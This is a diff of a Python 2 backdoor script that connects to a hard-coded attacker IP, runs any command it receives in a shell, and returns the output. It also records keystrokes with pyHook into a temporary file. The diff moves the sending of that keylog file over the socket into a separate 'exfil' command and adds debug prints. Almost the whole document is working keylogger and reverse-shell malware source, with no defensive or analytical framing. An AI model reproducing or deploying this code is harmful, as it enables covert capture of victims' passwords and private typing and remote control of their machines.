@@ -11,13 +11,16 @@ global keys
 
 global store
 store=''
-def transfer(s,path):					# to exfiltrate file
+def transfer(s,path):
     if os.path.exists(path):
-        f = open(path+'keylogs.txt', 'rb')
+        print path
+        f = open(path+'\keylogs.txt', 'rb')
         packet = f.read(1024)
         while packet != '':
-            s.send(packet) 
+            s.send(packet)
+            #print 'sending packet' -- for troubleshooting transfer
             packet = f.read(1024)
+            #print 'read new packet'
         s.send('DONE')
         f.close()
 
@@ -29,6 +32,7 @@ def connect():
     s.connect(('192.168.50.10', 8080))                            # Here we define the Attacker IP and the listening port
  
     while True:                                                 # keep receiving commands from the Kali machine
+        #print 'receiving command'              -- for testing
         command =  s.recv(1024)                                 # read the first KB of the tcp socket
         
         if 'terminate' in command:                  # if we got termiante order from the attacker, close the socket and break the loop
@@ -36,9 +40,10 @@ def connect():
             break
         if 'hook' in command:
             store=''
-            dirpath = tempfile.mkdtemp()	#create temp directory
-            prevdir=os.getcwd()			#save the location of script
-            os.chdir(dirpath)			#change current directory to created temp directory
+            dirpath = tempfile.mkdtemp()
+            #print dirpath			-- for testing
+            prevdir=os.getcwd()
+            os.chdir(dirpath)
             s.send('hooking')
             obj = pyHook.HookManager()
             obj.KeyDown = keypressed
@@ -54,29 +59,24 @@ def connect():
                     s.settimeout(None)
                 except Exception,e:
                     pass
-                if 'unhook' in x:		#to unhook after hooking starts and extract from temp folder
+                if 'unhook' in x:
+                    print 'before unhook'
                     obj.UnhookKeyboard()
-                    try:
-                        transfer(s,dirpath)		#exfiltrate
-                    except Exception,e:
-                        s.send(str(e))
-                        pass
-                    os.chdir(prevdir)		#revert back to prev cwd to enable deleting created temp folder
-                    s.send('unhooked and saved')
-                    shutil.rmtree(dirpath)
+                    print 'after unhook'
+                    os.chdir(prevdir)
+                    s.send('unhooked')
                     break
-                else:
-                    continue
-            #value=keys
-            #s.send(keys)
-            
-                    #start the hooking loop and pump out the messages
-            
-              #remember that per Pyhook documentation we must have a Windows message pump
-        #if 'unhook' in command:
-            #s.send('unhooked')
-            #obj.UnhookKeyboard()
-            
+                    
+                    
+                
+        if 'exfil' in command:
+            try:
+                transfer(s,dirpath)
+            except Exception,e:
+                s.send(str(e))
+                pass
+            shutil.rmtree(dirpath)                  #to delete created temp file 
+
             
         
         else:                                      # otherwise, we pass the received command to a shell process
@@ -84,28 +84,26 @@ def connect():
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read()  ) # send back the result
             s.send( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error
-def keypressed(event):			#the function that keylogs
+def keypressed(event):
     global keys
     global store
     keys=''
     
     
     
-    if event.Ascii==13:			#manually record enter
+    if event.Ascii==13:
         keys=' < Enter > ' 
-    elif event.Ascii==8:		#and return
+    elif event.Ascii==8:
         keys=' <BACK SPACE> '
     else:
         keys=chr(event.Ascii)
     
     print keys
     store = store + keys
-    print store				#for testing script
+    print store
     fp=open("keylogs.txt","w")
     fp.write(store)
     fp.close()
-    
-    
     return True
 
 def main ():
@@ -113,3 +111,10 @@ def main ():
     connect()
     keypressed(event)
 main()
+
+
+
+
+
+
+
